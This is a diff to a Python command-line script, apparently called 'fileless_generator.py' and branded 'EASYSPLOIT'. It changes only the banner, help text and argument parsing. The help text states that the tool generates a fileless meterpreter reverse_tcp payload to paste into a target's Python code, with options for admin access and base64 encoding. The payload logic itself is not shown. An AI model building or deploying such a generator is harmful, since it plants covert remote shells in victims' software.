@@ -3,13 +3,24 @@ import base64
 import zlib
 
 HELP_MESSAGE = """
+
+███████╗ █████╗ ███████╗██╗   ██╗███████╗██████╗ ██╗      ██████╗ ██╗████████╗
+██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
+█████╗  ███████║███████╗ ╚████╔╝ ███████╗██████╔╝██║     ██║   ██║██║   ██║   
+██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
+███████╗██║  ██║███████║   ██║   ███████║██║     ███████╗╚██████╔╝██║   ██║   
+╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
+                                                                              
+
 This script generates a fileless payload that can be used to execute a meterpreter reverse_tcp payload on a target machine.
 The generated code should be pasted in the target python code.
 
-Example:
+Usage:
 python3 fileless_generator.py <IP> <PORT> [-a] [-t] [-e] [-o <OUTPUT FILE>]
 python3 fileless_generator.py <IP> <PORT> [--admin] [--threading] [--encoding] [--output <OUTPUT FILE>]
+"""
 
+"""
 Arguments:
 <IP>: IP address of the attacker machine.
 <PORT>: Port number to listen on.
@@ -19,14 +30,15 @@ Arguments:
 -o or --output: Output file to save the code.
 -h or --help: Show this help message.
 """
-parser = argparse.ArgumentParser(description='Generate a fileless payload.', epilog=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter)
+
+parser = argparse.ArgumentParser(description=HELP_MESSAGE, formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False)
 parser.add_argument('ip', type=str, help='IP address')
 parser.add_argument('port', type=int, help='Port number')
 parser.add_argument('-a', '--admin', action='store_true', help='Include admin path')
 parser.add_argument('-t', '--threading', action='store_true', help='Include threading')
 parser.add_argument('-e', '--encoding', action='store_true', help='Include base64 encoding')
 parser.add_argument('-o', '--output', type=str, help='Output file to save the code')
-
+parser.add_argument('-h', '--help', action='help', help='Show this help message')
 
 args = parser.parse_args()
 
